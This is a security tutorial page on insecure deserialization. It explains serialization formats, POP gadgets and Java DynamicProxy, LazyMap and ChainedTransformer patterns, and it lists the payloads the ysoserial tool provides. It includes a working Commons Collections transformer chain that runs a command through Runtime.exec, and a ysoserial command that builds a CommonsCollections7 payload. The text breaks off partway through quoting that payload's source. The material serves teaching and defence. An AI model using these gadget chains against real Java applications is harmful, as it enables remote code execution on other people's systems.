.codehilite .n{color:#333333}
.codehilite .na{color:teal}
.codehilite .nb{color:#0086b3}
.codehilite .nc{color:#445588;font-weight:bold}
.codehilite .no{color:teal}
.codehilite .ni{color:purple}
.codehilite .ne{color:#990000;font-weight:bold}
.codehilite .nf{color:#990000;font-weight:bold}
.codehilite .nn{color:#555555}
.codehilite .nt{color:navy}
.codehilite .nv{color:teal}
.codehilite .ow{font-weight:bold}
.codehilite .w{color:#bbbbbb}
.codehilite .mf{color:#009999}
.codehilite .mh{color:#009999}
.codehilite .mi{color:#009999}
.codehilite .mo{color:#009999}
.codehilite .sb{color:#dd1144}
.codehilite .sc{color:#dd1144}
.codehilite .sd{color:#dd1144}
.codehilite .s2{color:#dd1144}
.codehilite .se{color:#dd1144}
.codehilite .sh{color:#dd1144}
.codehilite .si{color:#dd1144}
.codehilite .sx{color:#dd1144}
.codehilite .sr{color:#009926}
.codehilite .s1{color:#dd1144}
.codehilite .ss{color:#990073}
.codehilite .bp{color:#999999}
.codehilite .vc{color:teal}
.codehilite .vg{color:teal}
.codehilite .vi{color:teal}
.codehilite .il{color:#009999}
.codehilite .gc{color:#999;background-color:#EAF2F5}
</style><title>readme</title></head><body><article class="markdown-body"><h1 id="the-big-problem-of-serialization">The big problem of serialization<a class="headerlink" href="#the-big-problem-of-serialization" title="Permanent link"></a></h1>
<p>One of the biggest security issues affecting OOP Languages during the last years was &ldquo;Unsafe Deserialization&rdquo;. As a wide range of literature is already available for this issue, the main objective of this document is not to introduce something new about it, but to provide a brief and precise explanation of the vulnerability, as well as common exploitation and detection methods, which can be applied on different programming languages. </p>
<h2 id="serialization-what-is-it">Serialization: What is it?<a class="headerlink" href="#serialization-what-is-it" title="Permanent link"></a></h2>
<p>Object serialization, also known as &ldquo;marshalling&rdquo;, is just a process that converts an object-state, in the form of an arbitrarily complicated data structure, in a way (commonly a serialized string) that can be easily sent in message, stored in a database, or saved in a text file. The serialized object-state could then be reconstructed using the opposite process, called deserialization, or &ldquo;unmarshalling&rdquo;, producing an object that is &ldquo;semantically&rdquo; identical to the original.</p>
<p>If we look at just the definition, it seems to be an easy process, but effectively it&rsquo;s not. Serialization is a low-level technique that violates encapsulation and breaks the opacity of an abstract data type. </p>
<p>In many programming languages, the ones we are more interested in, serialization is natively supported (usually within core libraries) and no additional code development is required.</p>
<p>These languages are:</p>
<ul>
<li>Java</li>
<li>.NET</li>
<li>PHP</li>
<li>Python</li>
<li>NodeJS</li>
<li>Ruby</li>
</ul>
<p>The result of the serialization process is the so called &ldquo;archive&rdquo;, or archive medium.
Serialization archive formats fall into two main categories: text-based (stream of text characters) and binary format (stream of bytes). Typical examples of text-based formats include raw text format, JavaScript Object Notation (JSON) and Extensible Markup Language (XML). Binary formats are more implementation-dependent and are not so standardized.
The advantages of using a text-based archive over a binary archive is portability and human-readability (which allows easier debugging), but usually is more time-consuming, while using binary formats would be faster and easier, but at the cost of readability and portability.
There is a third category usually referred to as &ldquo;Hybrid&rdquo;, like PHP serialization, Python pickle and others.
At the time of writing, JSON and XML are the most known and standardised formats.</p>
<ul>
<li>JSON: text format that supports tree-like object structures and allows simple validation</li>
<li>XML: self-descriptive text format that supports tree-like object structures and allows data validation; however, it takes a lot of memory.</li>
</ul>
<h2 id="deserialization-what-i-need-to-know">Deserialization: What I need to know?<a class="headerlink" href="#deserialization-what-i-need-to-know" title="Permanent link"></a></h2>
<p>Now that we know what it is, how can this be used to trigger a vulnerability?
Well, the truth is that deserialization is not vulnerable by itself. As many other examples in code development, things can be implemented securely or not.
This led to the definition of &ldquo;Insecure Deserialization&rdquo;, and it&rsquo;s actually a combination of factors which altogether allow the exploitation of the deserialization process.</p>
<p>The main concept behind insecure deserialization is that we can force the application loading an arbitrary class object during the unmarshalling process, eventually achieving different things, from DoS to RCE.</p>
<p>But what are these conditions? The conditions needed to exploit the deserialization process may vary depending on language and platform involved.</p>
<p>While proceeding further, it&rsquo;s necessary to define the generic structure of a deserialization exploit:</p>
<ol>
<li>Find an application endpoint that deserialize user controllable data</li>
<li>Find a <strong>Gadget</strong> for exploitation</li>
<li>Develop a serializer to build the payload (Ready-to-use tools are available)</li>
<li>Use the payload against the endpoint</li>
</ol>
<p>Important to define at this point is the concept of <strong>Gadget</strong>. If you are familiar with binary exploitation, you should have some knowledge on ROP gadgets, that are commonly used to exploit application bypassing DEP/NX. The concept here is quite similar, while POP (Property Oriented Programming) is used instead of ROP. POP gadgets are classes or piece of classes with the following characteristics:</p>
<ul>
<li>Can be serialized</li>
<li>Has public/accessible properties (class variables, we&rsquo;ll specify later on)</li>
<li>Implements specific vulnerable methods</li>
<li>[Language dependent: Has access to other &ldquo;callable&rdquo; classes]</li>
</ul>
<p>Formally, a set of gadgets may be enough to constitute a Turing-complete language, in which case, it is possible for an attacker to achieve RCE on the target application, using a POP chain.</p>
<p><strong>Note about code samples:</strong> All the code of this document can be found in the main github.com repository, <a href="https://github.com/klezVirus/klezVirus.github.io/tree/master/The_Big_Problem_of_Serialisation">here</a>.</p>
<h3 id="java">Java<a class="headerlink" href="#java" title="Permanent link"></a></h3>
<p>The following chapter will focus on JAVA based deserialization issues, and will be divided by archive format, binary and text-based.</p>
<h4 id="java-binary-seriliazed-archive">Java: Binary Seriliazed Archive<a class="headerlink" href="#java-binary-seriliazed-archive" title="Permanent link"></a></h4>
<p>In JAVA, objects can be serialiazed only if their class implements the <code>java.io.Serializable</code> interface. 
The most common method used to serialize objects is using ByteStreams. A simple example is provided below:</p>
<div class="codehilite"><pre><span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.Serializable</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Desert</span> <span class="kd">implements</span> <span class="n">Serializable</span><span class="o">{</span>

    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">long</span> <span class="n">serialVersionUID</span> <span class="o">=</span> <span class="mi">1L</span><span class="o">;</span>
    <span class="kd">public</span> <span class="n">String</span> <span class="n">name</span><span class="o">;</span>
    <span class="kd">public</span> <span class="kt">int</span> <span class="n">width</span><span class="o">;</span>
    <span class="kd">public</span> <span class="kt">int</span> <span class="n">height</span><span class="o">;</span>

    <span class="kd">public</span> <span class="nf">Desert</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">,</span> <span class="kt">int</span> <span class="n">i</span><span class="o">,</span> <span class="kt">int</span> <span class="n">j</span><span class="o">)</span> <span class="o">{</span>
        <span class="c1">// Constructor</span>
        <span class="k">this</span><span class="o">.</span><span class="na">name</span> <span class="o">=</span> <span class="n">name</span><span class="o">;</span>
        <span class="k">this</span><span class="o">.</span><span class="na">width</span> <span class="o">=</span> <span class="n">i</span><span class="o">;</span>
        <span class="k">this</span><span class="o">.</span><span class="na">height</span> <span class="o">=</span> <span class="n">j</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">Deserialize</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">try</span><span class="o">{</span>
            <span class="c1">//Creating an input stream to reconstruct the object from serialised data</span>
            <span class="n">ObjectInputStream</span> <span class="n">in</span><span class="o">=</span><span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="s">&quot;de.ser&quot;</span><span class="o">));</span>
            <span class="n">Desert</span> <span class="n">desert</span><span class="o">=(</span><span class="n">Desert</span><span class="o">)</span><span class="n">in</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
            <span class="c1">// Showing the data of the serialised object</span>
            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;The desert: &quot;</span> <span class="o">+</span> <span class="n">desert</span><span class="o">.</span><span class="na">name</span><span class="o">);</span>
            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;Has a surface of: &quot;</span> <span class="o">+</span> <span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">desert</span><span class="o">.</span><span class="na">width</span><span class="o">*</span><span class="n">desert</span><span class="o">.</span><span class="na">height</span><span class="o">)</span> <span class="o">);</span>
            <span class="c1">// Closing the stream</span>
            <span class="n">in</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
            <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
                <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
                <span class="o">}</span>
            <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">Serialize</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="c1">// Creating the object</span>
            <span class="n">Desert</span> <span class="n">desert</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Desert</span><span class="o">(</span><span class="s">&quot;Mobi&quot;</span><span class="o">,</span> <span class="mi">2000</span><span class="o">,</span> <span class="mi">1500</span><span class="o">);</span>
            <span class="c1">// Creating output stream and writing the serialised object</span>
            <span class="n">FileOutputStream</span> <span class="n">outfile</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="s">&quot;de.ser&quot;</span><span class="o">);</span>
            <span class="n">ObjectOutputStream</span> <span class="n">outstream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">outfile</span><span class="o">);</span>
            <span class="n">outstream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">desert</span><span class="o">);</span>
            <span class="n">outstream</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
            <span class="c1">// closing the stream</span>
            <span class="n">outstream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;Serialized data saved to de.ser&quot;</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span> <span class="n">args</span><span class="o">[])</span> <span class="o">{</span>
        <span class="kt">boolean</span> <span class="n">serialize</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>

        <span class="k">if</span> <span class="o">(</span><span class="n">serialize</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">Desert</span><span class="o">.</span><span class="na">Serialize</span><span class="o">();</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="n">Desert</span><span class="o">.</span><span class="na">Deserialize</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>

<p>Once executed, it would give us the following file:</p>
<div class="codehilite"><pre>$ hexdump.exe -C de.ser
00000000  ac ed 00 05 73 72 00 06  44 65 73 65 72 74 31 91  |....sr..Desert1.|
00000010  71 33 04 c2 c7 18 02 00  03 49 00 06 68 65 69 67  |q3.......I..heig|
00000020  68 74 49 00 05 77 69 64  74 68 4c 00 04 6e 61 6d  |htI..widthL..nam|
00000030  65 74 00 12 4c 6a 61 76  61 2f 6c 61 6e 67 2f 53  |et..Ljava/lang/S|
00000040  74 72 69 6e 67 3b 78 70  00 00 05 dc 00 00 07 d0  |tring;xp........|
00000050  74 00 04 4d 6f 62 69                              |t..Mobi|
00000057
</pre></div>

<p>The starting bytes, <code>ac ed 00 05</code> are a known signature for JAVA serialized objects. Prior to step further on, we should notice that the <code>Deserialize</code> function, calls one of the potentially exploitable function of JAVA, <code>readObject()</code>. This function, indeed, constitutes one of the POP gadgets of JAVA. During the deserialization via <code>readObject()</code>, the serialized-object properties are accessed recursively, untill every properties have been read. This process occurs due to the nature of serialization (As an exact clone of the original object is the result of this process, each and every property must be read and re-instantiated). </p>
<p>How can we exploit it? Basically, the trick is to pass an arbitrary nested object to the <code>readObject()</code> function, forcing the application to instantiate a chain of POP gadgets, leading to RCE. The POP gadgets that can be used may vary depending on the application <code>CLASSPATH</code> (as any gadget function must be on the classpath in order to be instantiated [Visibility Constraint]). 
The ROP chain uses an opaque class order in order to chain subsequent classes using reflection, which allows to dynamically load classes and methods even without prior knowledge of these classes and methods. A common pattern used to create chains is the DynamicProxy pattern, which more details can be found <a href="https://docs.oracle.com/javase/8/docs/technotes/guides/reflection/proxy.html">here</a>.</p>
<p>Following, a very basic example of DynamicProxy implementation:</p>
<div class="codehilite"><pre><span class="kn">import</span> <span class="nn">java.lang.reflect.InvocationHandler</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Proxy</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">DynamicProxy</span> <span class="kd">implements</span> <span class="n">InvocationHandler</span> <span class="o">{</span>

    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">invoke</span><span class="o">(</span><span class="n">Object</span> <span class="n">proxy</span><span class="o">,</span> <span class="n">Method</span> <span class="n">method</span><span class="o">,</span> <span class="n">Object</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> 
      <span class="kd">throws</span> <span class="n">Throwable</span> <span class="o">{</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;Invoked method: &quot;</span> <span class="o">+</span> <span class="n">method</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
        <span class="k">return</span> <span class="n">method</span><span class="o">.</span><span class="na">getName</span><span class="o">();</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span> <span class="n">args</span><span class="o">[])</span> <span class="o">{</span>
        <span class="n">Map</span> <span class="n">proxyInstance</span> <span class="o">=</span> <span class="o">(</span><span class="n">Map</span><span class="o">)</span> <span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span>
        <span class="n">DynamicProxy</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">(),</span> 
        <span class="k">new</span> <span class="n">Class</span><span class="o">[]</span> <span class="o">{</span> <span class="n">Map</span><span class="o">.</span><span class="na">class</span> <span class="o">},</span> 
        <span class="k">new</span> <span class="n">DynamicProxy</span><span class="o">());</span>

        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">proxyInstance</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
    <span class="o">}</span>   
<span class="o">}</span>
</pre></div>

<p>The above, would produce as output &ldquo;toString&rdquo;. It should be noted that the use of <code>map</code>, is arbitrary, whatever object class could be used on its place. The idea of using this approach is that we can bind arbitrary code to execute whenever a specific method is invoked.</p>
<p>Another useful pattern (technically more a class than a pattern), which is crucial to understand how we can trigger remote code execution during deserialization, is the <code>ChainedTransformer</code> class.</p>
<p>A transformer, in JAVA, is a class which takes an object and returns a new object instance. A chained transformer, for instance, can chain multiple transformer togheter to transform an object multiple times, in sequence. To understand how this can be used to reach RCE, we can take the following example:</p>
<div class="codehilite"><pre><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.InvocationTargetException</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">ExeCmdInvokerTransformer</span> <span class="o">{</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span> <span class="n">args</span><span class="o">[])</span> <span class="kd">throws</span> <span class="n">NoSuchMethodException</span><span class="o">,</span> <span class="n">SecurityException</span><span class="o">,</span> <span class="n">IllegalAccessException</span><span class="o">,</span> <span class="n">IllegalArgumentException</span><span class="o">,</span> <span class="n">InvocationTargetException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>

        <span class="kd">final</span> <span class="n">String</span><span class="o">[]</span> <span class="n">execArgs</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&quot;cmd /c calc&quot;</span><span class="o">};</span>

        <span class="c1">// Chain to transform object in -&gt; ((Runtime)Runtime.class.getMethod(&quot;getRuntime&quot;).invoke(Object.class, null)).exec(&quot;cmd /c calc&quot;);</span>
        <span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
            <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
            <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&quot;getMethod&quot;</span><span class="o">,</span>
                <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
                <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">&quot;getRuntime&quot;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[</span><span class="mi">0</span><span class="o">]}),</span>
            <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&quot;invoke&quot;</span><span class="o">,</span>
                <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
                <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[</span><span class="mi">0</span><span class="o">]}),</span>
            <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&quot;exec&quot;</span><span class="o">,</span>
                <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> 
                <span class="n">execArgs</span>
                 <span class="o">),</span>
            <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="mi">1</span><span class="o">)};</span>

        <span class="n">Transformer</span> <span class="n">transformerChain</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>

        <span class="c1">// Testing the transformer</span>
        <span class="n">Object</span> <span class="n">object</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Object</span><span class="o">();</span>
        <span class="n">transformerChain</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="n">object</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>

<p>Above, the chain transformer takes an arbitrary object, ignores it, calls runtime <code>exec</code>, and executes an arbitrary command (in this case <code>cmd /c calc</code>).</p>
<p>The last pattern we&rsquo;ll see to understand how to reach RCE via deserialization works, is the &ldquo;key creation via LazyMap key search miss&rdquo;. A LazyMap, in JAVA, is a decorator (function that can be applied to an object, a Map in this case) that gets executed whenever a key is requested in a Map, invoking a transformer. The terms &ldquo;lazy&rdquo; , refers to the fact that a map decorated with a LazyMap decorator isn&rsquo;t filled by (key, value) pairs from the start, but it gets populated once the first call to a map key forces the transformer to execute, fetching the correct value for the requested key. To understand how the proces works, we can see the following example:</p>
<div class="codehilite"><pre><span class="kn">import</span> <span class="nn">java.util.*</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">HowLazyMap</span> <span class="o">{</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span> <span class="n">args</span><span class="o">[])</span> <span class="o">{</span>
    <span class="c1">// Create a Transformer to get random areas</span>
        <span class="n">Transformer</span> <span class="n">randomArea</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">(</span> <span class="o">)</span> <span class="o">{</span>
            <span class="kd">public</span> <span class="n">Object</span> <span class="nf">transform</span><span class="o">(</span> <span class="n">Object</span> <span class="n">object</span> <span class="o">)</span> <span class="o">{</span>
                <span class="n">String</span> <span class="n">name</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">object</span><span class="o">;</span>
                <span class="n">Random</span> <span class="n">random</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Random</span><span class="o">();</span>
                <span class="k">return</span> <span class="n">random</span><span class="o">.</span><span class="na">nextDouble</span><span class="o">();</span>
            <span class="o">}</span>
        <span class="o">};</span>

        <span class="c1">// Create a LazyMap called desertAreasLazy, which uses the above Transformer</span>
        <span class="n">Map</span> <span class="n">deserts</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">(</span> <span class="o">);</span>
        <span class="n">Map</span> <span class="n">desertAreasLazy</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span> <span class="n">deserts</span><span class="o">,</span> <span class="n">randomArea</span> <span class="o">);</span>

        <span class="c1">// Set name to fetch</span>
        <span class="n">String</span> <span class="n">desertName</span> <span class="o">=</span> <span class="s">&quot;Gobi&quot;</span><span class="o">;</span>

        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">&quot;Deserts contains %s? Result: %s&quot;</span><span class="o">,</span> <span class="n">desertName</span><span class="o">,</span> <span class="n">deserts</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">desertName</span><span class="o">)));</span>  

        <span class="c1">// Get name, print area</span>
        <span class="n">String</span> <span class="n">area</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">desertAreasLazy</span><span class="o">.</span><span class="na">get</span><span class="o">(</span> <span class="n">desertName</span> <span class="o">));</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span> <span class="s">&quot;Area: &quot;</span> <span class="o">+</span> <span class="n">area</span> <span class="o">);</span>

        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">&quot;Deserts now contains %s? Result: %s&quot;</span><span class="o">,</span> <span class="n">desertName</span><span class="o">,</span> <span class="n">deserts</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">desertName</span><span class="o">)));</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>

<p>The result would be something like:</p>
<div class="codehilite"><pre>Deserts contains Gobi? Result: null
Area: 0.8610944732469801
Deserts now contains Gobi? Result: 0.8610944732469801
</pre></div>

<p>Showing that the LazyMap populates the HashMap with a &ldquo;lazy&rdquo; approach.</p>
<p>How can this be exploited during the deserialization process? Easy.</p>
<p>We can create a LazyMap, set a Dynamic Proxy to hook a key creation, and execute a chained transformer on the hook. Does that seems fair? </p>
<h4 id="ysoserial">Ysoserial<a class="headerlink" href="#ysoserial" title="Permanent link"></a></h4>
<p>During the years, a set of common libraries were identified that can be used to build POP chains. These libraries are known as <strong>gadget libraries</strong>.</p>
<p>These common libraries can be automatically used to generate exploit payloads, using a very powerful tool named <strong>ysoserial</strong>, available <a href="https://github.com/frohoff/ysoserial">here</a>.</p>
<p>The available payloads are listed below:
<div class="codehilite"><pre>     Payload             Authors                                Dependencies
     -------             -------                                ------------
     BeanShell1          @pwntester, @cschneider4711            bsh:2.0b5
     C3P0                @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11
     Clojure             @JackOfMostTrades                      clojure:1.8.0
     CommonsBeanutils1   @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
     CommonsCollections1 @frohoff                               commons-collections:3.1
     CommonsCollections2 @frohoff                               commons-collections4:4.0
     CommonsCollections3 @frohoff                               commons-collections:3.1
     CommonsCollections4 @frohoff                               commons-collections4:4.0
     CommonsCollections5 @matthias_kaiser, @jasinner            commons-collections:3.1
     CommonsCollections6 @matthias_kaiser                       commons-collections:3.1
     CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1
     FileUpload1         @mbechler                              commons-fileupload:1.3.1, commons-io:2.4
     Groovy1             @frohoff                               groovy:2.3.9
     Hibernate1          @mbechler
     Hibernate2          @mbechler
     JBossInterceptors1  @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     JRMPClient          @mbechler
     JRMPListener        @mbechler
     JSON1               @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
     JavassistWeld1      @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     Jdk7u21             @frohoff
     Jython1             @pwntester, @cschneider4711            jython-standalone:2.5.2
     MozillaRhino1       @matthias_kaiser                       js:1.7R2
     MozillaRhino2       @_tint0                                js:1.7R2
     Myfaces1            @mbechler
     Myfaces2            @mbechler
     ROME                @mbechler                              rome:1.0
     Spring1             @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
     Spring2             @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
     URLDNS              @gebl
     Vaadin1             @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14
     Wicket1             @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4
</pre></div></p>
<p>For the Deserialization example provided above, let&rsquo;s suppose we wanted to craft a payload using ysoserial and CommonsCollection7:</p>
<div class="codehilite"><pre><span class="nv">$ </span>ysoserial CommonsCollections7 <span class="s2">&quot;cmd /c calc.exe&quot;</span> &gt; ./Serialize/de.ser
</pre></div>

<p>If you try to open it using the example JAVA file, of course it won&rsquo;t work, showing a <code>java.lang.ClassNotFoundException: org.apache.commons.collections.map.LazyMap</code> exception. The reason is always the &ldquo;visibility constraint&rdquo;. As this payload uses <code>CommonsCollections:3.1</code>, which is not part of standard JAVA SDK, the POP gadgets to build the required chain cannot be found. In order to make it work, we should be sure to have this dependency on the application classpath. A working example, where the <code>org.apache.commons-collections:3.1</code> dependency has been added, can be found <a href="https://github.com/klezVirus/klezVirus.github.io/tree/master/The_Big_Problem_of_Serialisation/java/Serialize">here</a>. </p>
<p>Now that we have a general understanding of the process, let&rsquo;s try to describe the full steps occurring during deserialization in Java using CommonsCollections7.</p>
<p>Payloads generated with ysoserial share a common structure, which use a Payload Runner using maps to setup the conditions, and a transformer to actually build and run OS commands. </p>
<p>Let&rsquo;s take a deep look at CommonsCollections7:</p>
<p><div class="codehilite"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">CommonsCollections7</span> <span class="kd">extends</span> <span class="n">PayloadRunner</span> <span class="kd">implements</span> <span class="n">ObjectPayload</span><span class="o">&lt;</span><span class="n">Hashtable</span><span class="o">&gt;</span> <span class="o">{</span>

    <span class="kd">public</span> <span class="n">Hashtable</span> <span class="nf">getObject</span><span class="o">(</span><span class="kd">final</span> <span class="n">String</span> <span class="n">command</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>

        <span class="c1">// Reusing transformer chain and LazyMap gadgets from previous payloads</span>
        <span class="kd">final</span> <span class="n">String</span><span class="o">[]</span> <span class="n">execArgs</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="n">command</span><span class="o">};</span>

